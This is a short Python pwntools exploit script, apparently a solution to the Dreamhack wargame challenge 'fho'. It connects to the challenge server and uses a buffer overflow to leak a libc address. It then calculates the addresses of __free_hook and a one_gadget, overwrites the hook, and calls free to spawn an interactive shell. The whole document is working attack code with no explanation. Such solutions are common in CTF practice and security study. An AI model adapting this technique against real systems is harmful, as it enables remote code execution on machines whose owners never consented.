from pwn import *

p = remote('host8.dreamhack.games', 8199)
#p = remote('localhost', 1000)
#p = process(['./ld-2.27.so', './fho'], env={"LD_PRELOAD":"./libc-2.27.so"})

context.log_level = 'debug'

# 1: Leak libc using BOF

p.sendafter(b'Buf: ', b'A'*0x48)
p.recvuntil(b'Buf: ')
p.recv(0x48)
libc_leak = u64(p.recv(8)[:6].ljust(8, b'\x00'))

print(f"{libc_leak:#x}")
libc_offset = 0x21b10 + 0xe7
LIBC = libc_leak - libc_offset
print(f"LIBC: {LIBC:#x}")


# 2: Overwrite __free_hook with one_gadget

freehook = LIBC + 0x3ed8e8
onegadget = LIBC + 0x4f432

p.sendlineafter(b'To write: ', str(freehook).encode())
p.sendlineafter(b'With: ', str(onegadget).encode())



# 3: Trigger free to get shell
p.sendlineafter(b'To free: ', b'1')


p.interactive()